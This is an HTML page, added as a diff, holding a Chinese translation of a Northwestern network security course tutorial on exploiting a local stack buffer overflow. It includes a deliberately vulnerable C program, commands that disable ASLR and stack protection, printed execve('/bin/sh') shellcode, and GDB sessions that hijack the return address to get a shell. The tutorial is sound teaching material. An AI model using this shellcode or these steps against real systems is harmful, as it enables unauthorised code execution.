@@ -1,0 +1,197 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<html><head>
+    <title>Network Penetration and Security — EECS 354 </title>
+    <meta http-equiv="Content-type" content="text/html; charset=UTF-8">
+    <link href="style/global.css" rel="stylesheet" type="text/css">
+    
+<link href="style/wiki.css" rel="stylesheet" type="text/css">
+
+</head>
+<body>
+
+  <div id="header">
+    <h1>Network Penetration and Security</h1>
+    <h2>Northwestern EECS, Fall Quarter 2014</h2>
+  </div>
+  <ul id="navigation">
+    
+    <li><a href="http://hamsa.cs.northwestern.edu/">Home</a></li>
+    <li><a href="http://hamsa.cs.northwestern.edu/schedule/">Schedule</a></li>
+    <li><a href="http://hamsa.cs.northwestern.edu/readings/">Readings</a></li>
+    <li><a href="http://hamsa.cs.northwestern.edu/projects/">Projects</a></li>
+
+    
+    
+    <li class="right"><a href="http://hamsa.cs.northwestern.edu/login/">Login</a></li>
+    
+    <li class="right"><a href="http://groups.google.com/group/nuctf">Newsgroup</a></li>
+  </ul>
+  
+  <div id="content">
+    
+  
+  <h1>缓冲区溢出</h1>
+
+<h2>简介</h2>
+<p>缓冲区溢出漏洞在软件中极其普遍。他们正在变得越来越难以利用。在软件项目被发现的此类漏洞越来越少，但是他们仍然会发生。许多内核和编译器级别的优化也会使缓冲区溢出变得难以利用。然而，学习如何利用这些漏洞开始学会如何破解是一个很好的地方。</p>
+
+<h2>配置</h2>
+<p>为了运行本教程，你将需要一个没有启用堆栈随机化的机器上。你可以使用<a href="http://netsec-playground.cs.northwestern.edu/"> netsec-playground.cs.northwestern.edu</a> 或禁用你自己计算机的堆栈随机化，使用以下命令:
+</p>
+<pre><code>sysctl -w kernel.randomize_va_space=0
+</code></pre><p>这将使您的计算机更容易受到攻击，但是当你重新启动它时，一切都会恢复正常。</p>
+
+<h2>Tutorial</h2>
+<p>本教程将引导您完成一个简单的，基于本地堆栈的缓冲区溢出的例子。下面是一个简短的内存管理失败的程序，<code>vulnerable.c</code>:
+</p>
+<pre><code>$ cat vulnerable.c 
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void foo (char *arg) {
+  char buffer[64];
+  strcpy(buffer, arg);
+}
+
+int main(int argc, char *argv[]) {
+  foo(argv[1]);
+  return(0);
+}
+</code></pre><p>程序的输入是一个参数。它把参数的内容拷贝到一个 64 字节的缓冲区。首先编译此程序，如下所示：</p>
+<pre><code>$ gcc -g -Wall -fno-stack-protector -z execstack -o vulnerable vulnerable.c
+</code></pre><p>复杂的 gcc 标志是用以允许在现代内核基于堆栈的开发。该程序事实上不会做任何事，但你可以一个简单的命令来验证它的脆弱性：</p>
+<pre><code>$ ./vulnerable `ruby -e 'print "A"*72'`
+Segmentation fault
+</code></pre><p>现在通过 GDB运行程序，并密切关注 <code>foo</code>的返回地址 (<code>save eip</code>中的值)。
+</p>
+<pre><code>$ gdb -q vulnerable
+Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
+(gdb) break foo
+Breakpoint 1 at 0x804837a: file vulnerable.c, line 6.
+(gdb) run `ruby -e 'print "A"*72'` 
+Starting program: /home/sam/vulnerable `ruby -e 'print "A"*72'`
+
+Breakpoint 1, foo (arg=0xbffff912 'A' &lt;repeats 72 times&gt;) at vulnerable.c:6
+6         strcpy(buffer, arg);
+(gdb) info frame
+Stack level 0, frame at 0xbffff710:
+ eip = 0x804837a in foo (vulnerable.c:6); saved eip 0x80483af
+ called by frame at 0xbffff720
+ source language c.
+ Arglist at 0xbffff708, args: arg=0xbffff912 'A' &lt;repeats 72 times&gt;
+ Locals at 0xbffff708, Previous frame's sp is 0xbffff710
+ Saved registers:
+  ebp at 0xbffff708, eip at 0xbffff70c
+(gdb) s
+7       }
+(gdb) info frame
+Stack level 0, frame at 0xbffff710:
+ eip = 0x804838c in foo (vulnerable.c:7); saved eip 0x41414141
+ called by frame at 0xbffff714
+ source language c.
+ Arglist at 0xbffff708, args: arg=0xbffff900 "home/sam/vulnerable"
+ Locals at 0xbffff708, Previous frame's sp is 0xbffff710
+ Saved registers:
+  ebp at 0xbffff708, eip at 0xbffff70c
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+</code></pre><p><code>info frame</code>命令返回当前函数的堆栈帧的信息。首先调用<code>info frame</code> 显示 eip 的当前位置是 <code>0x804837a</code> (实际中可能会不同)，而在函数退出时返回的eip地址是 <code>0x80483af</code> (实际中可能不同)。当执行 <code>strcpy () 函数</code> 后，<code>info frame</code> 显示 <code>foo</code> 将尝试返回到 <code>0x41414141</code>。返回地址刚好被输入字符串覆盖。
+</p>
+<p>现在应该尝试得到一个shell。利用此程序必要的是一些通用的shellcode以及该shellcode在内存中的位置。这些都可以通过同一个命令行程序来实现。</p>
+<pre><code>$ printf "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" &gt; shellcode.bin
+$ echo `cat shellcode.bin``ruby -e 'print "return_address"*2'`
+?^?1??F?F
+         ?
+          ???V
+              ̀1ۉ?@̀?????/bin/shreturn_addressreturn_address
+</code></pre><p>基本思想是将输入shellcode，紧跟在内存中的位置后面。一个有用的技巧是重复shellcode的地址多次以覆盖该函数的返回地址。重要的是，shellcdoe在内存中的位置恰好是字符串在内存中的位置。还有一下几个要点：</p>
+<ul>
+ <li>如果shellcode的长度是不能被四整除，则必须添加一些合适的填充值对齐到返回地址。</li>
+
+ <li>缓冲区的偏移量是受该程序的输入参数影响的。</li>
+</ul>
+<p>记住这几点，再次逐句通过GDB调式程序。</p>
+<pre><code>(gdb) run `cat shellcode.bin``ruby -e 'print "\xc8\xf6\xff\xbf"*10'`
+
+Starting program: /home/sam/vulnerable `cat shellcode.bin``ruby -e 'print "\xc8\xf6\xff\xbf"*10'`
+
+Breakpoint 1, foo (
+    arg=0xbffff906 "�\037^\211v\b1�\210F\a\211F\f�\v\211�\215N\b\215V\f�\2001�\211�@�\200�����/bin/sh����������������������������������������")
+    at vulnerable.c:6
+6         strcpy(buffer, arg);
+(gdb) x/s buffer
+0xbffff6c8:      ".N=
+</code></pre><p>暂停在<code>foo</code>，很明显该参数实际上包含了shellcode (/ bin/sh)。但是缓冲区的地址呢?在这一点上，它是与我们利用此漏洞的字符串的地址是相同的。逐句地通过 <code>strcpy () </code>看看会发生什么。
+</p>
+<pre><code>(gdb) s
+7       }
+(gdb) info frame
+Stack level 0, frame at 0xbffff710:
+ eip = 0x804838c in foo (vulnerable.c:7); saved eip 0xfff6c8bf
+ called by frame at 0xbffff714
+ source language c.
+ Arglist at 0xbffff708, args: arg=0xfff6c8bf &lt;Address 0xfff6c8bf out of bounds&gt;
+ Locals at 0xbffff708, Previous frame's sp is 0xbffff710
+ Saved registers:
+  ebp at 0xbffff708, eip at 0xbffff70c
+</code></pre><p>发生了什么?返回地址绝对覆盖，它看起来类似于 <code>0xbffff6c8</code>，但出错了。问题是shellcode不是四的倍数。用来利于这个漏洞的字符串的返回地址在堆栈上没有正确地对其。用 <code>nop</code> 指令来填充，使其得到一个正确的长度。<code>Nop</code>是no-operation的简称，是一条指示计算机在一个时钟周期内什么也不做的汇编指令。基于 x86 的 <code>nop</code> 指令的二进制是 <code>\x90</code>。再次通过 GDB运行如下 (请注意输入字符串的地址发生了变化)。
+</p>
+<pre><code>(gdb) run `ruby -e 'print "\x90"*3'``cat shellcode.bin``ruby -e 'print "\xb8\xf6\xff\xbf"*10'`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/sam/vulnerable `ruby -e 'print "\x90"*3'``cat shellcode.bin``ruby -e 'print "\xb8\xf6\xff\xbf"*10'`
+
+Breakpoint 1, foo (
+    arg=0xbffff903 "\220\220\220�\037^\211v\b1�\210F\a\211F\f�\v\211�\215N\b\215V\f�\2001�\211�@�\200�����/bin/sh����������������������������������������")
+    at vulnerable.c:6
+6         strcpy(buffer, arg);
+(gdb) x/s buffer
+0xbffff6b8:      ".N=
+(gdb) s
+7       }
+(gdb) info frame
+Stack level 0, frame at 0xbffff700:
+ eip = 0x804838c in foo (vulnerable.c:7); saved eip 0xbffff6b8
+ called by frame at 0xbffff704
+ source language c.
+ Arglist at 0xbffff6f8, args: 
+    arg=0xbffff6b8 "\220\220\220�\037^\211v\b1�\210F\a\211F\f�\v\211�\215N\b\215V\f�\2001�\211�@�\200�����/bin/sh����������������������������������������"
+ Locals at 0xbffff6f8, Previous frame's sp is 0xbffff700
+ Saved registers:
+  ebp at 0xbffff6f8, eip at 0xbffff6fc
+</code></pre><p>在这个时候，一切都看起来都很正常。利用此漏洞的字符串使用了正确的缓冲区地址， <code>foo</code> 的返回地址已成功地被覆盖成该值。接下来应该执行一个 shell。
+</p>
+<pre><code>(gdb) c
+Continuing.
+Executing new program: /bin/dash
+(no debugging symbols found)
+Error in re-setting breakpoint 1: Function "foo" not defined.
+(no debugging symbols found)
+(no debugging symbols found)
+$ echo about time                
+about time
+$ exit
+
+Program exited normally.
+</code></pre><p>成功了!<code>foo</code> 返回到内存中shellcode的位置，然后恢复正常允许。退出shell使 <code>vulnerable</code>正常退出。
+</p>
+
+<h2>课堂任务</h2>
+<p>在 GDB 以外利用这个相同的漏洞。你可以编辑源代码使用类似printf的函数帮助你调试，但是，不使用源代码地情形下也是可以利用了。</p>
+<p class="copyright">
+   Copyright 2008 the following:<br>
+Sam McIngvale <a href="mailto:sam.mcingvale@u.northwestern.edu">sam.mcingvale@u.northwestern.edu</a><br>
+Jim Spadaro <a href="mailto:j-spadaro@northwestern.edu">j-spadaro@northwestern.edu</a><br>
+Whitney Young <a href="mailto:wbyoung@u.northwestern.edu">wbyoung@u.northwestern.edu</a><br>
+All rights reserved.  Permission to reproduce this document in whole or in part must be obtained from the authors.
+</p>
+
+  </div>
+
+
+
+</body></html>
